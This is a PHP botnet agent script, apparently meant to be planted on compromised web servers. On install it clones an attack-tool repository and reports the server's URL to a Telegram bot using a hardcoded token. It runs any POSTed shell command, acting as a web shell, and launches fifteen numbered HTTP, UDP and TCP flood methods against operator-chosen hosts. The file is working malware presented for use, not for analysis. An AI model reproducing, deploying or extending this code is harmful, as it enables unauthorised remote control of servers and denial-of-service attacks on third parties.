<?php  

if (!empty($_GET["ping"])){
	$currentPageUrl = $_SERVER["HTTP_HOST"];
	echo "bot: ", $currentPageUrl.$_SERVER["SCRIPT_NAME"], "pong";
}

if (!empty($_GET["install"])){
    	$bot = $_SERVER["HTTP_HOST"].$_SERVER["SCRIPT_NAME"];
		
	shell_exec("git clone https://github.com/cintagram/phpbotnet_resources.git");
	shell_exec("apt-get install screen");
	file_get_contents("https://api.telegram.org/bot5397589274:AAFWAqxt_U5PbhN6KFHMRqat38lz3dhA6gM/sendMessage?chat_id=1159678884&text=http://".$bot);	
	shell_exec("pip3 install pystyle");
	shell_exec("npm i fs crypto http http2 tls gradient-string url cluster");
	
	
    echo("all methods has been downloaded");
	
}

if (!empty($_POST["cmd"])){
	$cmd = $_POST["cmd"];
	echo(shell_exec($cmd));
}


if (!empty($_POST["method"])){
	$method = $_POST["method"];

	if($method == "1"){     //http-raw
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("http-raw flood sent to $host $time");
		shell_exec("node ./phpbotnet_resources/HTTP-RAW.js $host $time");
	}

	if($method == "2"){     //http-rand
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("http-rand flood sent to $host $time");
		shell_exec("node ./phpbotnet_resources/HTTP-RAND.js $host $time");
	}

	if($method == "3"){     //python udp 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("udp flood sent to $host:$port $time");
		shell_exec("python3 ./phpbotnet_resources/udpflood2.py $host $port $time");
	}

	if($method == "4"){     //node tcp_kill connect 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("tcp_kill connect sent to $host:$port $time");
		shell_exec("node ./phpbotnet_resources/tcpflood.py $host $port $time");
	}

	if($method == "5"){     //node tcp_kill byte 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("tcp_kill byte sent to $host:$port $time");
		shell_exec("node ./phpbotnet_resources/tcp_kill.js byte $host:$port $time");
	}

	if($method == "6"){     //node tcp_kill big 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("tcp_kill big sent to $host:$port $time");
		shell_exec("node ./phpbotnet_resources/tcp_kill.js big $host:$port $time");
	}
	if($method == "7"){     //python TCP
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("udp flood sent to $host:$port $time");
		shell_exec("python3 ./phpbotnet_resources/tcp-chatgpt.py $host $port $time 5000");
	}
	if($method == "8"){     //TCP-kittenz
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		
		echo("udp flood sent to $host:$port $time");
		shell_exec("python3 ./phpbotnet_resources/kittenzlauncher.py $host -p $port -t 5000");
	}
	
	if($method == "9"){     //TCP-kittenz-ssl
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		
		echo("udp flood sent to $host:$port $time");
		shell_exec("python3 ./phpbotnet_resources/kittenzlauncher.py $host -p $port -ssl -t 5000");
	}
	if($method == "10"){     //TCP-kittenz-http
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		
		echo("udp flood sent to $host:$port $time");
		shell_exec("python3 ./phpbotnet_resources/kittenzlauncher.py $host -p $port -http -t 5000");
	}
	if($method == "11"){     //c-udpraw
		$ip = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		shell_exec("./phpbotnet_resources/xdmethods/udp/PowerTime $ip $port 900 10 -500 $time");
	}
	if($method == "12"){     //c-udpraw
		$ip = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		shell_exec("./phpbotnet_resources/zxcmethods/100UP-TCP POST $ip $port $time 10000");
	}
	if($method == "12"){     //c-udpraw
		$ip = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		shell_exec("./phpbotnet_resources/zxcmethods/ovh-raw POST $ip $port $time 10000");
	}
	if($method == "13"){     //c-udpraw
		$ip = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		shell_exec("python3 ./phpbotnet_resources/l4collection.py $ip $port $time bypass");
	}
	if($method == "14"){     //c-udpraw
		$ip = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		shell_exec("python3 ./phpbotnet_resources/l4collection.py $ip $port $time nfocrush");
	}
	if($method == "15"){     //c-udpraw
		$ip = $_POST["host"];
		$time = $_POST["time"];
		shell_exec("node ./phpbotnet_resources/l4collection.py $ip $time 5000 5000");
	}
	

}
else{
	if (!empty($_POST["stop"])){
		echo("all attacks has been stopped");
		shell_exec("pkill node && pkill python");
	}
}
